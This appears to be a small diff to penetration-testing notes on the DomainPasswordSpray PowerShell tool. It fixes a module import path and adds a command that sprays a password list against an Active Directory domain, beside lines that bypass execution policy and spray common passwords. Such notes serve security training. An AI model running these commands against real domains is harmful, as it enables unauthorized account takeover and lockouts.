@@ -21,7 +21,7 @@ Repo: [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafth
 # Open cmd 
 powershell.exe -exec bypass
 
-Import-Module DomainPasswordSpray.ps1
+Import-Module .\DomainPasswordSpray.ps1
 ```
 
 
@@ -34,6 +34,9 @@ Invoke-DomainPasswordSpray -Password Freedom1 -OutFile spray_success -ErrorActio
 
 # Not authenticated in the domain:
 Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+# Spray a list of passwords
+Invoke-DomainPasswordSpray -PasswordList passwords.txt -Domain ad.trilocor.local
 
 
 ```
